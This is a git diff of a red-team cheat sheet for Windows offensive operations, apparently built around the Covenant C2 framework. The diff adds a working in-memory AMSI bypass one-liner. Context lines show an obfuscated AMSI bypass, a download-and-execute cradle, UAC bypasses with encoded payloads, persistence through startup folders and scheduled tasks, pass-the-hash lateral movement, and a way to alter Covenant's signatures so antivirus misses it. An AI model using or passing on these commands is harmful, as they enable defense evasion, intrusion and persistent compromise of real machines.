@@ -120,6 +120,11 @@ AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, scri
 # Base 64 AMSI bypass
 	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 	```
+	
+```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+
 
 ### 2) Powershell Oneliner
 
@@ -152,16 +157,9 @@ Find-LAPSDelegatedGroups
 ```
 
 
-### 5)
-
-### 6)
-
-### 7) 
-
-
 # PrivEsc
 
-#### PowerUp
+#### 1) PowerUp
 
 ```py
 powershell.exe -nop -exec bypass
@@ -176,7 +174,7 @@ powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString
 ```
 
 
-#### UAC Bypasses
+#### 2) UAC Bypasses
 
 Covenant has `BypassUACCommand` and `BypassUACGrunt` Tasks which can be used 
 
@@ -189,7 +187,7 @@ BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
 
 # Persistence
 
-##### Classic Startup folder
+##### 1) Classic Startup folder
 
 Just drop a binary in current user folder, will trigger when current user signs in:
 
@@ -202,7 +200,7 @@ Or in the startup folder, requires administrative privileges but will trigger as
 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
-##### Schedule Tasks
+##### 2) Schedule Tasks
 
 This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.
 
@@ -331,7 +329,7 @@ proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes 
 
 # Obfuscation
 	
-### 1) Covenant modified dropper
+### 1) Covenant use case - modified default dropper
 
 First of all we will clone the main Covenant repository into our local machine. Furthermore we will modifiy some of the default word used by Covenat 
 (Grunt, Jitter, Stage0, etc) in order to alter AV signature scanning capabilities. The bash script to automate this process is presented below:
